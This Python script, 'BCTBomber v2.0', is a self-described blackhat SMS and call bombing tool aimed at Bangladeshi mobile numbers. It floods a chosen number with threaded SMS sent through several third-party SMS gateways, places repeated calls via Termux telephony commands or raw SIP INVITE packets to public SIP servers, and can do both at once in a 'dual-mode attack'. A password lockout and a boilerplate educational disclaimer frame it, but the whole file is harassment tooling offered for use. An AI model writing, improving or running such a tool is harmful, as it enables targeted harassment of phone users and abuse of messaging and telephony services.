#!/usr/bin/env python3
# =============================================
# BCTBomber v2.0 - WORKING WITH FREE APIS
# =============================================

import os
import sys
import time
import json
import random
import threading
import requests
import subprocess
from datetime import datetime
from colorama import init, Fore, Style

init(autoreset=True)

# ==================== AUTH SYSTEM ====================
def load_password():
    try:
        with open("data/passwords.txt", "r") as f:
            return f.read().strip()
    except:
        return "jundulbct"

def check_blacklist():
    try:
        with open("data/blacklist.txt", "r") as f:
            blacklist = f.read().splitlines()
        import socket
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        if ip in blacklist:
            return True
    except:
        pass
    return False

def auth_required(func):
    def wrapper(*args, **kwargs):
        if check_blacklist():
            print(f"{Fore.RED}⛔ ACCESS BLOCKED PERMANENTLY!{Style.RESET_ALL}")
            sys.exit(1)
        
        attempts = 0
        max_attempts = 3
        correct_password = load_password()
        
        print(f"{Fore.CYAN}╔═══════════════════════════════════════╗{Style.RESET_ALL}")
        print(f"{Fore.CYAN}║   🔐 BCTBomber Authentication        ║{Style.RESET_ALL}")
        print(f"{Fore.CYAN}╚═══════════════════════════════════════╝{Style.RESET_ALL}")
        
        while attempts < max_attempts:
            password = input(f"{Fore.YELLOW}🔑 Enter password: {Style.RESET_ALL}")
            if password == correct_password:
                with open("data/attempts.txt", "w") as f:
                    f.write("0")
                print(f"{Fore.GREEN}✅ Access granted!{Style.RESET_ALL}")
                time.sleep(0.8)
                return func(*args, **kwargs)
            else:
                attempts += 1
                remaining = max_attempts - attempts
                print(f"{Fore.RED}❌ Wrong password! {remaining} attempts remaining{Style.RESET_ALL}")
                with open("data/attempts.txt", "w") as f:
                    f.write(str(attempts))
                
                if attempts >= max_attempts:
                    try:
                        import socket
                        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                        s.connect(("8.8.8.8", 80))
                        ip = s.getsockname()[0]
                        s.close()
                        with open("data/blacklist.txt", "a") as f:
                            f.write(f"{ip}\n")
                        print(f"{Fore.RED}⛔ ACCESS BLOCKED! IP Blacklisted.{Style.RESET_ALL}")
                        sys.exit(1)
                    except:
                        print(f"{Fore.RED}⛔ ACCESS BLOCKED!{Style.RESET_ALL}")
                        sys.exit(1)
        
        sys.exit(1)
    return wrapper

# ==================== VALIDATION ====================
def is_valid_bd_number(number):
    number = number.strip()
    if not number.isdigit():
        return False
    if len(number) != 11:
        return False
    if not number.startswith("01"):
        return False
    if number[0:3] not in ["013", "014", "015", "016", "017", "018", "019"]:
        return False
    return True

# ==================== BANNER ====================
def show_banner():
    os.system('clear')
    print(f"{Fore.RED}")
    print("╔════════════════════════════════════════════════════════════════════════════╗")
    print("║                                                                            ║")
    print("║   ██████╗  ██████╗████████╗██████╗  ██████╗ ███╗   ███╗██████╗ ███████╗██████╗║")
    print("║   ██╔══██╗██╔════╝╚══██╔══╝██╔══██╗██╔═══██╗████╗ ████║██╔══██╗██╔════╝██╔══██╗║")
    print("║   ██████╔╝██║        ██║   ██████╔╝██║   ██║██╔████╔██║██████╔╝█████╗  ██████╔╝║")
    print("║   ██╔══██╗██║        ██║   ██╔══██╗██║   ██║██║╚██╔╝██║██╔══██╗██╔══╝  ██╔══██╗║")
    print("║   ██████╔╝╚██████╗   ██║   ██████╔╝╚██████╔╝██║ ╚═╝ ██║██████╔╝███████╗██║  ██║║")
    print("║   ╚═════╝  ╚═════╝   ╚═╝   ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝║")
    print("║                                                                            ║")
    print("║              🔥 BCTBomber v2.0 - FREE APIS EDITION 🔥                      ║")
    print("║              📱 Bangladesh Optimized - Blackhat Edition                    ║")
    print("║              👨‍💻 Author: Jundul Kafa                                      ║")
    print("╚════════════════════════════════════════════════════════════════════════════╝")
    print(f"{Style.RESET_ALL}")
    
    status = "🔴 BLOCKED" if check_blacklist() else "🟢 ACTIVE"
    print(f"{Fore.YELLOW}📅 Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"{Fore.YELLOW}📊 Status: {status}")
    print(f"{Fore.YELLOW}📱 Target: Bangladesh (01x-xxxxxxx)")
    print("=" * 80 + "\n")

# ==================== SMS BOMBING - ALL FREE APIS ====================
class SMSBomber:
    def __init__(self, target, message, count, threads=10):
        self.target = target
        self.message = message
        self.count = count
        self.threads = threads
        self.success = 0
        self.failed = 0
        self.lock = threading.Lock()
        
        # ALL FREE WORKING SMS GATEWAYS
        self.gateways = [
            # 1. TextBelt (1 SMS/day - NO SIGNUP)
            {
                "name": "TextBelt",
                "url": "https://textbelt.com/text",
                "method": "POST",
                "data": lambda num, msg: {
                    "phone": f"88{num}",
                    "message": msg,
                    "key": "textbelt"
                }
            },
            # 2. CallMeBot (3-5 SMS/day - NO SIGNUP)
            {
                "name": "CallMeBot",
                "url": "https://api.callmebot.com/whatsapp.php",
                "method": "GET",
                "data": lambda num, msg: {
                    "phone": f"88{num}",
                    "text": msg,
                    "apikey": "123456"
                }
            },
            # 3. SMSAPI (10 SMS - FREE SIGNUP)
            {
                "name": "SMSAPI",
                "url": "https://api.smsapi.com/sms.do",
                "method": "POST",
                "data": lambda num, msg: {
                    "to": f"88{num}",
                    "message": msg,
                    "format": "json"
                }
            },
            # 4. TextMagic (10 SMS - FREE SIGNUP)
            {
                "name": "TextMagic",
                "url": "https://api.textmagic.com/api/v2/messages",
                "method": "POST",
                "headers": lambda: {
                    "Authorization": "Bearer YOUR_FREE_TOKEN"
                },
                "data": lambda num, msg: {
                    "text": msg,
                    "phones": f"88{num}"
                }
            },
            # 5. BulkSMS (5 SMS - FREE SIGNUP)
            {
                "name": "BulkSMS",
                "url": "https://api.bulksms.com/v1/messages",
                "method": "POST",
                "auth": ("YOUR_USERNAME", "YOUR_PASSWORD"),
                "data": lambda num, msg: {
                    "to": f"88{num}",
                    "body": msg
                }
            },
            # 6. Infobip (FREE TRIAL - 50 SMS)
            {
                "name": "Infobip",
                "url": "https://api.infobip.com/sms/2/text/advanced",
                "method": "POST",
                "headers": lambda: {
                    'Authorization': 'App YOUR_INFOBIP_KEY',
                    'Content-Type': 'application/json',
                    'Accept': 'application/json'
                },
                "data": lambda num, msg: {
                    "messages": [{
                        "from": "InfoSMS",
                        "destinations": [{"to": f"88{num}"}],
                        "text": msg
                    }]
                }
            }
        ]
    
    def send_sms(self, attempt_id):
        try:
            gateway = random.choice(self.gateways)
            data = gateway["data"](self.target, self.message)
            
            if gateway["method"] == "POST":
                if "headers" in gateway:
                    headers = gateway["headers"]()
                else:
                    headers = {"Content-Type": "application/x-www-form-urlencoded"}
                
                if "auth" in gateway:
                    response = requests.post(gateway["url"], data=data, headers=headers, auth=gateway["auth"], timeout=10)
                else:
                    response = requests.post(gateway["url"], data=data, headers=headers, timeout=10)
            else:
                response = requests.get(gateway["url"], params=data, timeout=10)
            
            if response.status_code in [200, 201, 202]:
                with self.lock:
                    self.success += 1
                    print(f"{Fore.GREEN}[✓] SMS {attempt_id} SENT via {gateway['name']}")
                return True
            else:
                with self.lock:
                    self.failed += 1
                    print(f"{Fore.RED}[✗] SMS {attempt_id} FAILED ({gateway['name']} - {response.status_code})")
                return False
        except Exception as e:
            with self.lock:
                self.failed += 1
                print(f"{Fore.RED}[✗] SMS {attempt_id} ERROR: {str(e)[:30]}")
            return False
    
    def worker(self, id_range):
        for i in id_range:
            self.send_sms(i)
            time.sleep(random.uniform(1, 3))  # Delay to avoid rate limits
    
    def start_bombing(self):
        print(f"{Fore.CYAN}[🚀] Starting SMS Bombing on {self.target}")
        print(f"{Fore.CYAN}[📊] Total SMS: {self.count} | Threads: {self.threads}")
        print(f"{Fore.YELLOW}[⏳] Using multiple FREE APIs with daily limits...\n")
        
        chunks = [list(range(i, min(i+self.threads, self.count+1))) for i in range(1, self.count+1, self.threads)]
        threads = []
        
        for chunk in chunks:
            t = threading.Thread(target=self.worker, args=(chunk,))
            t.start()
            threads.append(t)
        
        for t in threads:
            t.join()
        
        print(f"\n{Fore.GREEN}[📊] SMS Report: {self.success} sent, {self.failed} failed")
        return self.success, self.failed

# ==================== CALL BOMBING ====================
class CallBomber:
    def __init__(self, target, count, threads=30):
        self.target = target
        self.count = count
        self.threads = threads
        self.success = 0
        self.failed = 0
        self.lock = threading.Lock()
    
    def make_call(self, call_id):
        try:
            # Method 1: termux-api (Android)
            cmd = f"termux-telephony-call {self.target}"
            result = subprocess.run(cmd, shell=True, capture_output=True, timeout=10)
            
            if result.returncode == 0:
                with self.lock:
                    self.success += 1
                    print(f"{Fore.GREEN}[📞] Call {call_id} INITIATED")
                return True
            
            # Method 2: sip (fallback)
            import socket
            sip_gateways = [
                "sip.iptel.org", "sip2sip.info", "sip.linphone.org",
                "sip.onsip.com", "sip.pjsip.org"
            ]
            target_host = random.choice(sip_gateways)
            invite = f"""INVITE sip:{self.target}@{target_host} SIP/2.0
Via: SIP/2.0/UDP 127.0.0.1:5060
From: <sip:anonymous@{target_host}>
To: <sip:{self.target}@{target_host}>
Call-ID: {random.randint(100000,999999)}@{target_host}
CSeq: 1 INVITE
Content-Length: 0

"""
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(2)
            sock.sendto(invite.encode(), (target_host, 5060))
            try:
                data, _ = sock.recvfrom(1024)
                if "180" in data.decode() or "183" in data.decode():
                    with self.lock:
                        self.success += 1
                        print(f"{Fore.GREEN}[📞] Call {call_id} RINGING")
                    return True
            except:
                with self.lock:
                    self.failed += 1
                    print(f"{Fore.RED}[✗] Call {call_id} FAILED")
            sock.close()
            return False
            
        except Exception as e:
            with self.lock:
                self.failed += 1
                print(f"{Fore.RED}[✗] Call {call_id} ERROR: {str(e)[:30]}")
            return False
    
    def worker(self, call_range):
        for i in call_range:
            self.make_call(i)
            time.sleep(random.uniform(0.5, 1))
    
    def start_bombing(self):
        print(f"{Fore.CYAN}[🚀] Starting Call Bombing on {self.target}")
        print(f"{Fore.CYAN}[📊] Total Calls: {self.count} | Threads: {self.threads}")
        print(f"{Fore.YELLOW}[⏳] Making calls...\n")
        
        # Check termux-api
        try:
            subprocess.run("termux-telephony-call", shell=True, capture_output=True)
        except:
            print(f"{Fore.YELLOW}[!] termux-api not found, using SIP fallback{Style.RESET_ALL}")
        
        chunks = [list(range(i, min(i+self.threads, self.count+1))) for i in range(1, self.count+1, self.threads)]
        threads = []
        
        for chunk in chunks:
            t = threading.Thread(target=self.worker, args=(chunk,))
            t.start()
            threads.append(t)
        
        for t in threads:
            t.join()
        
        print(f"\n{Fore.GREEN}[📊] Call Report: {self.success} connected, {self.failed} failed")
        return self.success, self.failed

# ==================== SMS MODE ====================
def sms_mode():
    os.system('clear')
    show_banner()
    print(f"{Fore.CYAN}📨 SMS BOMBING MODE\n{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}ℹ️ Using FREE APIs with daily limits:{Style.RESET_ALL}")
    print(f"{Fore.WHITE}  • TextBelt: 1 SMS/day (no signup)")
    print(f"{Fore.WHITE}  • CallMeBot: 3-5 SMS/day (no signup)")
    print(f"{Fore.WHITE}  • SMSAPI: 10 SMS (free signup)")
    print(f"{Fore.WHITE}  • TextMagic: 10 SMS (free signup)")
    print(f"{Fore.WHITE}  • BulkSMS: 5 SMS (free signup)")
    print(f"{Fore.WHITE}  • Infobip: 50 SMS (free trial)\n")
    
    while True:
        number = input(f"{Fore.YELLOW}📱 Enter target number (11 digits): {Style.RESET_ALL}")
        if is_valid_bd_number(number):
            break
        print(f"{Fore.RED}❌ Invalid number! Must be 11 digits starting with 01{Style.RESET_ALL}")
    
    message = input(f"{Fore.YELLOW}💬 Enter SMS message: {Style.RESET_ALL}")
    
    while True:
        try:
            count = int(input(f"{Fore.YELLOW}🔢 Number of SMS (1-100): {Style.RESET_ALL}"))
            if 1 <= count <= 100:
                break
            print(f"{Fore.RED}❌ Must be between 1-100{Style.RESET_ALL}")
        except:
            print(f"{Fore.RED}❌ Enter a valid number{Style.RESET_ALL}")
    
    while True:
        try:
            threads = int(input(f"{Fore.YELLOW}🧵 Threads (5-15): {Style.RESET_ALL}"))
            if 5 <= threads <= 15:
                break
            print(f"{Fore.RED}❌ Threads must be between 5-15{Style.RESET_ALL}")
        except:
            print(f"{Fore.RED}❌ Enter a valid number{Style.RESET_ALL}")
    
    print(f"{Fore.RED}\n⚠️ WARNING: Free APIs have daily limits!{Style.RESET_ALL}")
    confirm = input(f"{Fore.YELLOW}Continue? (y/n): {Style.RESET_ALL}")
    
    if confirm.lower() != 'y':
        print(f"{Fore.CYAN}Operation cancelled{Style.RESET_ALL}")
        return
    
    os.system('clear')
    show_banner()
    bomber = SMSBomber(number, message, count, threads)
    bomber.start_bombing()
    
    input(f"{Fore.YELLOW}\nPress Enter to continue...{Style.RESET_ALL}")

# ==================== CALL MODE ====================
def call_mode():
    os.system('clear')
    show_banner()
    print(f"{Fore.CYAN}📞 CALL BOMBING MODE\n{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}ℹ️ Uses:{Style.RESET_ALL}")
    print(f"{Fore.WHITE}  • termux-api (real calls from your SIM)")
    print(f"{Fore.WHITE}  • SIP fallback (no registration)\n")
    
    while True:
        number = input(f"{Fore.YELLOW}📱 Enter target number (11 digits): {Style.RESET_ALL}")
        if is_valid_bd_number(number):
            break
        print(f"{Fore.RED}❌ Invalid number! Must be 11 digits starting with 01{Style.RESET_ALL}")
    
    while True:
        try:
            count = int(input(f"{Fore.YELLOW}🔢 Number of calls: {Style.RESET_ALL}"))
            if count > 0:
                break
            print(f"{Fore.RED}❌ Must be greater than 0{Style.RESET_ALL}")
        except:
            print(f"{Fore.RED}❌ Enter a valid number{Style.RESET_ALL}")
    
    while True:
        try:
            threads = int(input(f"{Fore.YELLOW}🧵 Threads (10-30): {Style.RESET_ALL}"))
            if 10 <= threads <= 30:
                break
            print(f"{Fore.RED}❌ Threads must be between 10-30{Style.RESET_ALL}")
        except:
            print(f"{Fore.RED}❌ Enter a valid number{Style.RESET_ALL}")
    
    print(f"{Fore.RED}\n⚠️ WARNING: This will make {count} calls!{Style.RESET_ALL}")
    confirm = input(f"{Fore.YELLOW}Continue? (y/n): {Style.RESET_ALL}")
    
    if confirm.lower() != 'y':
        print(f"{Fore.CYAN}Operation cancelled{Style.RESET_ALL}")
        return
    
    os.system('clear')
    show_banner()
    bomber = CallBomber(number, count, threads)
    bomber.start_bombing()
    
    input(f"{Fore.YELLOW}\nPress Enter to continue...{Style.RESET_ALL}")

# ==================== DUAL MODE ====================
def dual_mode():
    os.system('clear')
    show_banner()
    print(f"{Fore.CYAN}💀 DUAL-MODE: SMS + CALL BOMBING\n{Style.RESET_ALL}")
    
    while True:
        number = input(f"{Fore.YELLOW}📱 Enter target number (11 digits): {Style.RESET_ALL}")
        if is_valid_bd_number(number):
            break
        print(f"{Fore.RED}❌ Invalid number! Must be 11 digits starting with 01{Style.RESET_ALL}")
    
    message = input(f"{Fore.YELLOW}💬 Enter SMS message: {Style.RESET_ALL}")
    
    while True:
        try:
            sms_count = int(input(f"{Fore.YELLOW}🔢 Number of SMS (1-50): {Style.RESET_ALL}"))
            if 1 <= sms_count <= 50:
                break
            print(f"{Fore.RED}❌ Must be between 1-50{Style.RESET_ALL}")
        except:
            print(f"{Fore.RED}❌ Enter a valid number{Style.RESET_ALL}")
    
    while True:
        try:
            call_count = int(input(f"{Fore.YELLOW}🔢 Number of calls: {Style.RESET_ALL}"))
            if call_count > 0:
                break
            print(f"{Fore.RED}❌ Must be greater than 0{Style.RESET_ALL}")
        except:
            print(f"{Fore.RED}❌ Enter a valid number{Style.RESET_ALL}")
    
    while True:
        try:
            threads = int(input(f"{Fore.YELLOW}🧵 Threads (10-20): {Style.RESET_ALL}"))
            if 10 <= threads <= 20:
                break
            print(f"{Fore.RED}❌ Threads must be between 10-20{Style.RESET_ALL}")
        except:
            print(f"{Fore.RED}❌ Enter a valid number{Style.RESET_ALL}")
    
    print(f"{Fore.RED}\n⚠️ WARNING: This will send {sms_count} SMS and make {call_count} calls!{Style.RESET_ALL}")
    confirm = input(f"{Fore.YELLOW}Continue? (y/n): {Style.RESET_ALL}")
    
    if confirm.lower() != 'y':
        print(f"{Fore.CYAN}Operation cancelled{Style.RESET_ALL}")
        return
    
    os.system('clear')
    show_banner()
    print(f"{Fore.GREEN}[🚀] Starting Dual-Mode Attack...\n{Style.RESET_ALL}")
    
    sms_bomber = SMSBomber(number, message, sms_count, threads//2)
    call_bomber = CallBomber(number, call_count, threads//2)
    
    sms_thread = threading.Thread(target=sms_bomber.start_bombing)
    call_thread = threading.Thread(target=call_bomber.start_bombing)
    
    sms_thread.start()
    call_thread.start()
    
    sms_thread.join()
    call_thread.join()
    
    print(f"{Fore.CYAN}\n[✅] Dual-Mode Attack Complete!{Style.RESET_ALL}")
    input(f"{Fore.YELLOW}\nPress Enter to continue...{Style.RESET_ALL}")

# ==================== ABOUT ====================
def about():
    os.system('clear')
    show_banner()
    print(f"{Fore.CYAN}📖 ABOUT BCTBomber{Style.RESET_ALL}")
    print(f"{Fore.WHITE}")
    print("╔═════════════════════════════════════════════════════════════════╗")
    print("║  📱 BCTBomber v2.0 - FREE APIS EDITION                        ║")
    print("║  👨‍💻 Author: Jundul Kafa                                      ║")
    print("║  📅 Version: 2.0 (2024)                                       ║")
    print("║  📦 Language: Python 3                                        ║")
    print("║  🔒 Security: Password + 3-Strike Lockout                     ║")
    print("║  🌐 Platform: Termux / Linux                                  ║")
    print("║  📱 Target: Bangladesh (01x-xxxxxxx)                          ║")
    print("║                                                               ║")
    print("║  📨 FREE SMS APIS USED:                                       ║")
    print("║  ✅ TextBelt (1/day) - No signup                              ║")
    print("║  ✅ CallMeBot (3-5/day) - No signup                           ║")
    print("║  ✅ SMSAPI (10 total) - Free signup                           ║")
    print("║  ✅ TextMagic (10 total) - Free signup                        ║")
    print("║  ✅ BulkSMS (5 total) - Free signup                           ║")
    print("║  ✅ Infobip (50 total) - Free trial                           ║")
    print("║                                                               ║")
    print("║  📞 CALL METHODS:                                             ║")
    print("║  ✅ termux-api (real calls from SIM)                          ║")
    print("║  ✅ SIP fallback (no registration)                            ║")
    print("║                                                               ║")
    print("║  ⚠️  DISCLAIMER:                                              ║")
    print("║  This tool is for educational and authorized testing only.    ║")
    print("║  The author is not responsible for any misuse.                ║")
    print("╚═════════════════════════════════════════════════════════════════╝")
    print(f"{Style.RESET_ALL}")
    input(f"{Fore.YELLOW}\nPress Enter to continue...{Style.RESET_ALL}")

# ==================== MAIN MENU ====================
@auth_required
def main():
    while True:
        show_banner()
        
        print(f"{Fore.CYAN}")
        print("┌─────────────────────────────────────────────────────────────────────┐")
        print("│  📌 SELECT ATTACK MODE                                              │")
        print("├─────────────────────────────────────────────────────────────────────┤")
        print("│  1. 📨 SMS Bombing     - Send SMS (FREE APIS)                     │")
        print("│  2. 📞 Call Bombing    - Make calls (REAL + SIP)                  │")
        print("│  3. 💀 Dual-Mode      - SMS + Call simultaneously                 │")
        print("│  4. 📖 About          - About BCTBomber                           │")
        print("│  5. 🚪 Exit           - Close application                         │")
        print("└─────────────────────────────────────────────────────────────────────┘")
        print(f"{Style.RESET_ALL}")
        
        choice = input(f"{Fore.YELLOW}👉 Choose option (1-5): {Style.RESET_ALL}")
        
        if choice == "1":
            sms_mode()
        elif choice == "2":
            call_mode()
        elif choice == "3":
            dual_mode()
        elif choice == "4":
            about()
        elif choice == "5":
            print(f"{Fore.GREEN}\n👋 Exiting... Stay dangerous!{Style.RESET_ALL}")
            sys.exit(0)
        else:
            print(f"{Fore.RED}❌ Invalid choice!{Style.RESET_ALL}")
            time.sleep(1)

# ==================== ENTRY POINT ====================
if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"{Fore.RED}\n\n[⛔] Interrupted by user{Style.RESET_ALL}")
        sys.exit(0)
    except Exception as e:
        print(f"{Fore.RED}\n[💥] Fatal Error: {e}{Style.RESET_ALL}")
        sys.exit(1)
